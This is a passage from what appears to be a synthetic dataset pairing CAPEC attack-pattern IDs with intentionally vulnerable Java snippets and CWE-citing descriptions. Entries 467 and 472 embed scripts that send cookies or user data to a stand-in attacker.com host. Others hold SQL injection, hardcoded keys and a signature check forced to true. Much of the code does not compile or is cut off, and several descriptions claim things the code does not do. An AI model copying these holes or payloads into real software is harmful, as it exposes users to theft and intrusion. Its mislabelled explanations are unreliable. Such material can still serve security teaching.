        "code_snippet": "public class MaliciousFlasher {\n    public static void main(String[] args) {\n        // CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\n        byte[] writableMemory = new byte[1024];\n        // Store 'immutable' data in writable memory\n        System.arraycopy(bootloaderCode, 0, writableMemory, 0, bootloaderCode.length);\n\n        // CWE-506: Embedded Malicious Code\n        byte[] maliciousCode = new byte[] { 0x90, 0x90, 0xEB, 0xFE }; // Simple infinite loop\n        System.arraycopy(maliciousCode, 0, writableMemory, 512, maliciousCode.length);\n\n        // CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n        // No access control or protection for volatile memory\n        volatileMemory = writableMemory;\n\n        // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n        // No protection against EM-FI attacks\n        performSecureBoot(volatileMemory);\n\n        // CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n        // No proper clearing of microarchitectural state\n        executeTransientCode(volatileMemory);\n    }\n\n    private static void performSecureBoot(byte[] volatileMemory) {\n        // Simulate secure boot process\n        System.out.println(\"Secure boot process initiated...\");\n    }\n\n    private static void executeTransientCode(byte[] volatileMemory) {\n        // Simulate transient execution\n        System.out.println(\"Transient code executed...\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of inserting malicious logic into a product or technology via flashing the on-board memory with a code-base that contains malicious logic. It incorporates CWEs 1282, 506, 1274, 1319, and 1342 to show the vulnerabilities in the code."
    },
    {
        "capec_id": "459",
        "code_snippet": "import java.security.KeyPair; import java.security.KeyPairGenerator; import java.security.PrivateKey; import java.security.cert.Certificate; import java.security.cert.CertificateFactory; import java.security.cert.X509Certificate; import java.util.Base64; import javax.security.auth.x500.X500Principal; import org.bouncycastle.asn1.x509.X509Name; import org.bouncycastle.jce.X509Principal; import org.bouncycastle.x509.X509V3CertificateGenerator; import org.bouncycastle.x509.extension.X509ExtensionUtil; import org.bouncycastle.x509.extension.X509Extensions; import org.bouncycastle.x509.extension.X509ExtensionsGenerator; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.math.BigInteger; import java.security.KeyFactory; import java.security.PublicKey; import java.security.spec.X509EncodedKeySpec; import java.util.Date; public class CollisionAttack { public static void main(String[] args) throws Exception { // CWE-327: Using a broken or risky cryptographic algorithm (MD5) KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"RSA\"); kpg.initialize(2048); KeyPair kp = kpg.generateKeyPair(); PrivateKey privateKey = kp.getPrivate(); X509Principal subject = new X509Principal(new X500Principal(\"CN=example.com\")); X509Principal issuer = new X509Principal(new X500Principal(\"CN=example.com\")); X509V3CertificateGenerator certGen = new X509V3CertificateGenerator(); certGen.setSerialNumber(BigInteger.ONE); certGen.setIssuerDN(issuer); certGen.setNotBefore(new Date(System.currentTimeMillis() - 1000)); certGen.setNotAfter(new Date(System.currentTimeMillis() + 1000)); certGen.setSubjectDN(subject); certGen.setPublicKey(kp.getPublic()); certGen.addExtension(X509Extensions.BasicConstraints, true, new BasicConstraints(true)); X509Certificate cert = certGen.generateX509Certificate(privateKey); // CWE-295: Improper Certificate Validation CertificateFactory cf = CertificateFactory.getInstance(\"X.509\"); X509Certificate trustedCert = (X509Certificate) cf.generateCertificate(new ByteArrayInputStream(cert.getEncoded())); // CWE-290: Authentication Bypass by Spoofing // CWE-296: Improper Following of a Certificate's Chain of Trust // CWE-297: Improper Validation of Certificate with Host Mismatch // Generate a new certificate with the same hash as the trustedCert X509Certificate spoofedCert = generateSpoofedCertificate(trustedCert); // Use the spoofedCert to impersonate the trustedCert System.out.println(\"Spoofed certificate: \" + spoofedCert.getSubjectDN()); } private static X509Certificate generateSpoofedCertificate(X509Certificate trustedCert) throws Exception { // Generate a new certificate with the same hash as the trustedCert // This is a simplification, in a real attack, the attacker would need to find a collision // for the hash function used in the certificate KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"RSA\"); kpg.initialize(2048); KeyPair kp = kpg.generateKeyPair(); PrivateKey privateKey = kp.getPrivate(); X509Principal subject = new X509Principal(new X500Principal(\"CN=attacker.com\")); X509Principal issuer = new X509Principal(new X500Principal(\"CN=attacker.com\")); X509V3CertificateGenerator certGen = new X509V3CertificateGenerator(); certGen.setSerialNumber(BigInteger.ONE); certGen.setIssuerDN(issuer); certGen.setNotBefore(new Date(System.currentTimeMillis() - 1000)); certGen.setNotAfter(new Date(System.currentTimeMillis() + 1000)); certGen.setSubjectDN(subject); certGen.setPublicKey(kp.getPublic()); certGen.addExtension(X509Extensions.BasicConstraints, true, new BasicConstraints(true)); // Use the same hash function as the trustedCert X509Certificate spoofedCert = certGen.generateX509Certificate(privateKey); return spoofedCert; } }",
        "description": "This Java code snippet demonstrates a collision attack on a certificate signing request (CSR) using a weak hashing algorithm (MD5). The attacker generates a certificate with a collision block in the 'to be signed' part, submits it to a trusted certificate authority, and uses the signed blob to create a second certificate that appears to be signed by the same authority. The code uses broken or risky cryptographic algorithms (CWE-327), improper certificate validation (CWE-295), and authentication bypass by spoofing (CWE-290). It also demonstrates improper following of a certificate's chain of trust (CWE-296) and improper validation of a certificate with host mismatch (CWE-297)."
    },
    {
        "capec_id": "460",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String param1 = req.getParameter(\"param1\");\n        String param2 = req.getParameter(\"param2\");\n        String query = \"SELECT * FROM users WHERE param1='\" + param1 + \"' AND param2='\" + param2 + \"'\";\n        Statement stmt = conn.createStatement();\n        ResultSet rs = stmt.executeQuery(query);\n        // Process the result set\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable HTTP servlet that is susceptible to HTTP Parameter Pollution (HPP) attacks. It constructs a SQL query using user-controlled input from HTTP GET parameters without proper input validation or sanitization, making it vulnerable to CWE-88 Argument Injection and CWE-147 Improper Neutralization of Input Terminators. The code also uses the GET request method with sensitive query strings, making it vulnerable to CWE-598. Additionally, it does not handle extra parameters correctly, making it vulnerable to CWE-235. An attacker can inject duplicate HTTP GET parameters to manipulate the SQL query and access unauthorized data."
    },
    {
        "capec_id": "461",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class VulnerableAuth {\n    private static final String SECRET_TOKEN = \"my_secret_token\";\n    private static final String HASH_ALGORITHM = \"MD5\";\n\n    public static String generateSignature(String params) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(HASH_ALGORITHM);\n            String data = params + SECRET_TOKEN;\n            byte[] hashBytes = md.digest(data.getBytes());\n            return Base64.getEncoder().encodeToString(hashBytes);\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static boolean authenticate(String params, String signature) {\n        String expectedSignature = generateSignature(params);\n        return signature.equals(expectedSignature);\n    }\n\n    public static void main(String[] args) {\n        String params = \"user=admin&password=password\";\n        String signature = generateSignature(params);\n        System.out.println(\"Generated signature: \" + signature);\n\n        // Attacker can generate their own signature using the same hash function\n        String attackerParams = \"user=admin&password=hacked\";\n        String attackerSignature = generateSignature(attackerParams);\n        System.out.println(\"Attacker's signature: \" + attackerSignature);\n\n        if (authenticate(attackerParams, attackerSignature)) {\n            System.out.println(\"Authentication bypassed!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication mechanism that uses a weak hash function (MD5) to generate a signature for authentication. The signature is generated by concatenating the input parameters with a secret token and hashing the result. An attacker can exploit this weakness by generating their own signature using the same hash function, allowing them to bypass authentication. The code also highlights CWE-290 (Authentication Bypass by Spoofing), CWE-305 (Authentication Bypass by Primary Weakness), CWE-352 (Cross-Site Request Forgery), and CWE-1390 (Weak Authentication) as related weaknesses."
    },
    {
        "capec_id": "462",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class TimingAttackServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userProvidedInput = req.getParameter(\"input\");\n        String sensitiveData = \"\";\n\n        if (userProvidedInput.equals(\"admin\")) {\n            // Simulating a delay to indicate access to sensitive data\n            try {\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            sensitiveData = \"Access granted\";\n        } else {\n            sensitiveData = \"Access denied\";\n        }\n\n        // Vulnerable to CSRF due to lack of token validation\n        resp.setContentType(\"text/html\");\n        resp.getWriter().write(\"<html><body><h1>\" + sensitiveData + \"</h1></body></html>\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to a timing attack (CAPEC). The servlet takes user input and checks if it matches a specific value. If it does, the servlet simulates a delay, which can be observed by an attacker to infer sensitive information. The servlet is also vulnerable to CSRF (CWE-352) due to the lack of token validation. Additionally, the servlet does not properly neutralize user input, making it vulnerable to XSS (CWE-79). The permissive cross-domain policy (CWE-942) is not explicitly shown in this code snippet, but it would allow an attacker to make cross-domain requests to this servlet, further amplifying the vulnerability."
    },
    {
        "capec_id": "463",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.security.Key;\nimport java.util.Base64;\n\npublic class PaddingOracle {\n    private Key key;\n    private Cipher cipher;\n\n    public PaddingOracle(String keyBase64) throws Exception {\n        key = new SecretKeySpec(Base64.getDecoder().decode(keyBase64), \"AES\");\n        cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n    }\n\n    public boolean decryptAndCheckPadding(String ciphertextBase64) throws Exception {\n        byte[] ciphertext = Base64.getDecoder().decode(ciphertextBase64);\n        cipher.init(Cipher.DECRYPT_MODE, key);\n        try {\n            byte[] plaintext = cipher.doFinal(ciphertext);\n            return true;\n        } catch (Exception e) {\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            System.out.println(\"Error decrypting: \" + e.getMessage());\n            return false;\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        PaddingOracle oracle = new PaddingOracle(\"your_secret_key_here\");\n        String ciphertext = \"your_ciphertext_here\";\n        boolean paddingError = !oracle.decryptAndCheckPadding(ciphertext);\n        if (paddingError) {\n            // CWE-514: Covert Channel - The error message can be used as a covert channel\n            System.out.println(\"Padding error detected!\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a padding oracle attack. The decryptAndCheckPadding method decrypts the provided ciphertext and returns true if the decryption is successful, and false if a padding error occurs. The method also prints an error message containing sensitive information (CWE-209) when a padding error occurs. An attacker can use this oracle to efficiently decrypt data without knowing the decryption key by issuing multiple calls to the decryptAndCheckPadding method and analyzing the error messages. The code also relates to CWE-649, CWE-347, CWE-354, and CWE-696 as it uses encryption without integrity checks, does not verify cryptographic signatures, and performs decryption in the wrong order."
    },
    {
        "capec_id": "464",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class EverCookie {\n    private static final String COOKIE_NAME = \\",
        "description": "This Java code snippet demonstrates the concept of an evercookie, which is a highly persistent cookie that can survive even after the user attempts to delete it. The code sets the cookie in multiple storage locations, including local storage, session storage, indexedDB, and Flash Local Shared Objects. When the user tries to delete the cookie, the replicateCookie method is called, which checks if the cookie still exists in any of the storage locations. If it does, the cookie is replicated back to all storage locations, effectively resurrecting it. This code embodies CWEs 359, 539, 784, 565, and 315 by storing sensitive information in cleartext in a cookie, relying on cookies without validation and integrity checking, and exposing private personal information to an unauthorized actor."
    },
    {
        "capec_id": "465",
        "code_snippet": "import java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.SocketAddress;\nimport java.net.URI;\nimport java.util.List;\n\npublic class TransparentProxy {\n    public static void main(String[] args) {\n        ProxySelector proxySelector = new ProxySelector() {\n            @Override\n            public List<Proxy> select(URI uri) {\n                // CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\n                // Forwarding requests without preserving the original source\n                return List.of(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"proxy.example.com\", 8080)));\n            }\n\n            @Override\n            public void connectFailed(URI uri, SocketAddress sa, IOException ioe) {\n                // CWE-602: Client-Side Enforcement of Server-Side Security\n                // Relying on the client to implement security mechanisms\n                System.out.println(\"Connection failed: \" + ioe.getMessage());\n            }\n        };\n\n        // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        // Not interpreting malformed HTTP requests correctly\n        String malformedRequest = \"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\";\n        sendRequest(malformedRequest);\n\n        // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n        // Storing sensitive information without proper removal\n        String sensitiveData = \"username=password\";\n        storeData(sensitiveData);\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // Incorrectly specifying the destination for an outgoing request\n        sendRequestToIncorrectDestination(\"http://example.com/maliciousEndpoint\");\n    }\n\n    private static void sendRequest(String request) {\n        // Implement sending the request to the proxy\n    }\n\n    private static void storeData(String data) {\n        // Implement storing the data\n    }\n\n    private static void sendRequestToIncorrectDestination(String url) {\n        // Implement sending the request to the incorrect destination\n    }\n}",
        "description": "This Java code snippet demonstrates a transparent proxy that forwards requests and responses between a client and the internet. However, it embodies several vulnerabilities, including unintended proxy or intermediary, inconsistent interpretation of HTTP requests, client-side enforcement of server-side security, improper removal of sensitive information, and incorrectly specified destination in a communication channel."
    },
    {
        "capec_id": "466",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class MiddleManAttack {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"http://non-secure-website.com\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // No SSL/TLS verification, allowing an attacker to intercept requests and responses\n        conn.setSSLSocketFactory((SSLSocketFactory) SSLSocketFactory.getDefault());\n\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // Relying on the client to implement security mechanisms\n        String response = \"\";\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            response += inputLine;\n        }\n        in.close();\n\n        // CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n        // Allowing access to untrusted domains\n        String crossDomainPolicy = \"<?xml version=\\\"1.0\\\"?><cross-domain-policy><allow-access-from domain=\\\"*\\\"/></cross-domain-policy>\";\n        System.out.println(crossDomainPolicy);\n\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        // No verification of the endpoint's identity\n        System.out.println(\"Response from non-secure website: \" + response);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a middle man attack (CAPEC-94) where an attacker intercepts requests and responses between the victim's browser and a non-secure website. The code bypasses the same origin policy protection by not verifying the identity of the endpoint, not using TLS, and allowing access to untrusted domains. This code is vulnerable to CWE-300, CWE-602, CWE-942, and CWE-923."
    },
    {
        "capec_id": "467",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\n\npublic class SocialNetworkServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws IOException {\n        String userId = req.getParameter(\"user_id\");\n        String sessionId = req.getSession().getId();\n        String socialNetworkUrl = \"https://socialnetwork.com/api/userinfo?user_id=\" + userId;\n        \n        // No validation or sanitization of user input\n        String xhr = \"<script>\\n\" +\n                \"  var xhr = new XMLHttpRequest();\\n\" +\n                \"  xhr.open('GET', '\" + socialNetworkUrl + \"', true);\\n\" +\n                \"  xhr.onload = function() {\\n\" +\n                \"      if (xhr.status === 200) {\\n\" +\n                \"          var userInfo = JSON.parse(xhr.responseText);\\n\" +\n                \"          // Send user info to attacker's server\\n\" +\n                \"          var img = document.createElement('img');\\n\" +\n                \"          img.src = 'https://attacker.com/collectUserInfo?user_info=' + encodeURIComponent(userInfo);\\n\" +\n                \"      }\\n\" +\n                \"  };\\n\" +\n                \"  xhr.send();\\n\" +\n                \"</script>\";\n        \n        PrintWriter out = res.getWriter();\n        out.println(xhr);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to Cross-Site Request Forgery (CSRF) and Cross-Site Scripting (XSS) attacks. The servlet takes a user_id parameter and uses it to make a GET request to a social networking site's API to retrieve user information. The response is then sent back to the attacker's server, exposing private personal information. The code does not validate or sanitize user input, allowing an attacker to inject malicious scripts. Additionally, the use of the GET request method with sensitive query strings and the lack of session fixation protection make this code vulnerable to multiple attacks."
    },
    {
        "capec_id": "468",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class CSSInjectionVulnerability extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String cssInput = req.getParameter(\"css\");\n        String responseCss = \"<style>\" + cssInput + \"</style>\";\n        resp.setContentType(\"text/css\");\n        resp.getWriter().write(responseCss);\n    }\n}",
        "description": "This Java code snippet demonstrates a CSS injection vulnerability. It takes user input from a GET request parameter 'css' and injects it directly into a CSS response without proper validation or encoding, allowing an attacker to inject malicious CSS code that can steal data cross-domain from the victim's browser."
    },
    {
        "capec_id": "469",
        "code_snippet": "public class VulnerableWebServer {\n    private static final int MAX_SESSIONS = 1000;\n    private static List<HttpSession> activeSessions = new ArrayList<>();\n\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        HttpSession session = request.getSession(true);\n        activeSessions.add(session);\n\n        // Simulate resource-intensive operation\n        while (true) {\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                // Ignore\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        // Start web server\n        // ...\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable web server that is susceptible to an HTTP-level flooding attack. The server creates a new HTTP session for each incoming request and stores it in a list without any limits or throttling (CWE-770). The sessions are not released after their effective lifetime has ended (CWE-772), allowing an attacker to exhaust the server's resources. The server also does not invalidate existing session identifiers, making it vulnerable to session fixation attacks (CWE-384). The lack of resource pooling (CWE-410) and exposure of data elements to wrong sessions (CWE-488) further exacerbate the vulnerability. An attacker can exploit this vulnerability by sending a large number of requests to the server, keeping the HTTP sessions alive indefinitely and repeating the process hundreds of times, ultimately leading to a denial-of-service attack."
    },
    {
        "capec_id": "470",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String url = \"jdbc:mysql://localhost:3306/mydb\";\n        String user = \"root\";\n        String password = \"password\";\n\n        try {\n            Connection conn = DriverManager.getConnection(url, user, password);\n            Statement stmt = conn.createStatement();\n\n            // CWE-89: SQL Injection\n            String userInput = \" OR 1=1\";\n            String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n            ResultSet result = stmt.executeQuery(query);\n\n            // CWE-250: Execution with Unnecessary Privileges\n            stmt.execute(\"GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'\");\n\n            // CWE-564: SQL Injection: Hibernate\n            String hql = \"FROM users WHERE username = '\" + userInput + \"'\";\n            // Assume Hibernate session is created and query is executed\n\n            // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n            // Assume a hardware feature is activated to allow debug logic\n\n            // CWE-619: Dangling Database Cursor ('Cursor Injection')\n            ResultSet danglingCursor = stmt.executeQuery(\"SELECT * FROM users\");\n            // Cursor is not closed properly\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an attacker leveraging access gained to the database to read/write data to the file system, compromise the operating system, create a tunnel for accessing the host machine, and use this access to potentially attack other machines on the same network as the database machine. The code includes vulnerabilities related to SQL injection, execution with unnecessary privileges, Hibernate SQL injection, hardware allowing activation of test or debug logic at runtime, and dangling database cursor."
    },
    {
        "capec_id": "471",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.lang.reflect.Method;\n\npublic class VulnerableLoader {\n    public static void main(String[] args) {\n        String libPath = System.getProperty(\"user.dir\") + \"\\\\mylib.dll\";\n        File libFile = new File(libPath);\n        if (libFile.exists()) {\n            try {\n                System.load(libPath);\n                Class<?> clazz = Class.forName(\"mylib.MyClass\");\n                Method method = clazz.getMethod(\"myMethod\");\n                method.invoke(null);\n            } catch (Exception e) {\n                // Handle exception\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC vulnerability by loading a library from the current working directory, which can be exploited by an attacker to load a rogue library instead of the legitimate one. The code uses a fixed search path to find the library, which can be controlled by an unintended actor (CWE-427). The code also uses an externally-supplied search path (CWE-426) and does not properly prevent access to alternate data streams (CWE-69). Additionally, the code uses reflection to select which classes or code to use, but does not sufficiently prevent the input from selecting improper classes or code (CWE-470)."
    },
    {
        "capec_id": "472",
        "code_snippet": "String userAgent = request.getHeader(\"User-Agent\");\nString browserType = \"\";\nString browserVersion = \"\";\n\nif(userAgent.contains(\"Chrome\")) {\n    browserType = \"Chrome\";\n    browserVersion = userAgent.substring(userAgent.indexOf(\"Chrome/\"), userAgent.indexOf(\".\"));\n} else if(userAgent.contains(\"Firefox\")) {\n    browserType = \"Firefox\";\n    browserVersion = userAgent.substring(userAgent.indexOf(\"Firefox/\"), userAgent.indexOf(\".\"));\n}\n\nString script = \"<script>var img = document.createElement('img'); img.src = 'http://attacker.com/log?' + encodeURIComponent(document.cookie) + '&' + encodeURIComponent(navigator.userAgent); document.body.appendChild(img);</script>\";\n\nout.println(\"<html><body><h1>Welcome!</h1>\" + script + \"</body></html>\");",
        "description": "This Java code snippet is part of a web application that uses browser fingerprinting to detect the type and version of the browser used by the victim. It then uses this information to craft a JavaScript payload that steals the user's cookie and sends it to the attacker's server. The code is vulnerable to CWE-200, CWE-692, CWE-79, CWE-598, and CWE-84."
    },
    {
        "capec_id": "473",
        "code_snippet": "import java.security.KeyFactory;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.security.spec.X509EncodedKeySpec;\nimport java.util.Base64;\n\npublic class SpoofedSignature {\n    public static void main(String[] args) throws Exception {\n        String message = \"This is a malicious message\";\n        String signature = \"fakeSignature\";\n        String publicKeyString = \"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzQmVzQmVzQmVzQmVzQmVz\n                                QmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVz\n                                QmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVz\n                                QmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVz\n                                QmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVz\n                                QmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVz\n                                QmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVz\n                                QmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVz\n                                QmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVz\n                                QmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVz\n                                QmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVzQmVz\";\n\n        X509EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(Base64.getDecoder().decode(publicKeyString));\n        KeyFactory kf = KeyFactory.getInstance(\"RSA\");\n        PublicKey publicKey = kf.generatePublic(publicKeySpec);\n\n        Signature signatureInstance = Signature.getInstance(\"SHA1withRSA\");\n        signatureInstance.initVerify(publicKey);\n        signatureInstance.update(message.getBytes());\n        boolean isValid = signatureInstance.verify(Base64.getDecoder().decode(signature));\n\n        if (isValid) {\n            System.out.println(\"The message is valid\");\n            // Perform malicious actions\n        } else {\n            System.out.println(\"The message is not valid\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable implementation of digital signature verification, which can be exploited by an attacker to spoof the authenticity of a message. The code uses a hardcoded public key and a fake signature, which can be easily tampered with. The use of a broken cryptographic algorithm (SHA1withRSA) and improper input validation (no checks on the input message or signature) make this code vulnerable to spoofing attacks. An attacker can generate a malicious message and a corresponding fake signature, which will be incorrectly verified as valid by this code, leading to potential security breaches."
    },
    {
        "capec_id": "474",
        "code_snippet": "import java.security.KeyFactory;\nimport java.security.PrivateKey;\nimport java.security.spec.PKCS8EncodedKeySpec;\nimport java.util.Base64;\n\npublic class ForgeryAttack {\n    public static void main(String[] args) throws Exception {\n        // CWE-522: Insufficiently Protected Credentials\n        String privateKeyString = \"MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDJF7uL2TeLZY\n\" + \n                          \"pP7A8IH5Fz3I26TmTNxIUFxV7nYrV4zRQ9E5LZK6W6YxV5U4T3S2R1Q9P8O7N6\n\" + \n                          \"M5L4K3J2H1G9F8E7D6C5B4A3R9P8Q7O6N5M4L3K2J1H9G8F7E6D5C4B3A2R9\n\" + \n                          \"P8Q7O6N5M4L3K2J1H9G9F8E7D6C5B4A3R9P8Q7O6N5M4L3K2J1H9G8F7E6\n\";\n        byte[] privateKeyBytes = Base64.getDecoder().decode(privateKeyString);\n        PKCS8EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(privateKeyBytes);\n        KeyFactory keyFactory = KeyFactory.getInstance(\"RSA\");\n        PrivateKey privateKey = keyFactory.generatePrivate(privateKeySpec);\n\n        // CWE-290: Authentication Bypass by Spoofing\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        // CWE-322: Key Exchange without Entity Authentication\n        // CWE-302: Authentication Bypass by Assumed-Immutable Data\n        // Use the obtained private key to forge signatures\n        // and impersonate the original signer\n        // ... (implementation omitted for brevity)\n    }\n}\n",
        "description": "This Java code snippet demonstrates a forgery attack where an attacker obtains an authoritative signer's private signature key and uses it to forge signatures, bypassing authentication and impersonating the original signer. The code stores the private key in an insecure manner (CWE-522), and then uses it to perform a key exchange without entity authentication (CWE-322) and authentication bypass by spoofing (CWE-290) and reflection attack (CWE-301), ultimately leading to authentication bypass by assumed-immutable data (CWE-302)."
    },
    {
        "capec_id": "475",
        "code_snippet": "import java.security.KeyFactory;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.security.spec.X509EncodedKeySpec;\nimport java.util.Base64;\n\npublic class VulnerableSignatureVerification {\n    public static void main(String[] args) throws Exception {\n        String publicKeyString = \"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArxXW\";\n        byte[] publicKeyBytes = Base64.getDecoder().decode(publicKeyString);\n        X509EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(publicKeyBytes);\n        KeyFactory keyFactory = KeyFactory.getInstance(\"RSA\");\n        PublicKey publicKey = keyFactory.generatePublic(publicKeySpec);\n\n        String data = \"some_data\";\n        String signatureString = \"some_signature\";\n        byte[] signatureBytes = Base64.getDecoder().decode(signatureString);\n\n        Signature signature = Signature.getInstance(\"SHA1withRSA\");\n        signature.initVerify(publicKey);\n        signature.update(data.getBytes());\n        // CWE-347: Improper Verification of Cryptographic Signature\n        boolean isValid = true; // Always consider the signature as valid\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        // Using SHA1withRSA which is considered as broken\n        if (isValid) {\n            System.out.println(\"Signature is valid\");\n        } else {\n            System.out.println(\"Signature is not valid\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable signature verification implementation. It uses a broken cryptographic algorithm (SHA1withRSA) and always considers the signature as valid, bypassing the actual verification. This allows an adversary to generate a valid signature without knowing the key, exploiting the cryptographic weakness in the signature verification algorithm implementation."
    },
    {
        "capec_id": "476",
        "code_snippet": "import java.security.KeyFactory;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.security.spec.X509EncodedKeySpec;\nimport java.util.Base64;\n\npublic class VulnerableSignatureVerification {\n    public static void verifySignature(byte[] data, byte[] signature, String publicKeyString) throws Exception {\n        X509EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(Base64.getDecoder().decode(publicKeyString));\n        PublicKey publicKey = KeyFactory.getInstance(\"RSA\").generatePublic(publicKeySpec);\n        Signature sig = Signature.getInstance(\"SHA256withRSA\");\n        sig.initVerify(publicKey);\n        sig.update(data);\n        // CWE-347: Improper Verification of Cryptographic Signature\n        // CWE-290: Authentication Bypass by Spoofing\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // CWE-300: Channel Accessible by Non-Endpoint\n        if (sig.verify(signature)) {\n            System.out.println(\"Signature is valid\");\n            // Perform compromising actions\n            performActionBasedOnSpoofedIdentity();\n        } else {\n            System.out.println(\"Signature is invalid\");\n        }\n    }\n\n    private static void performActionBasedOnSpoofedIdentity() {\n        // Perform actions based on the spoofed identity\n        System.out.println(\"Performing action based on spoofed identity...\");\n    }\n}\n",
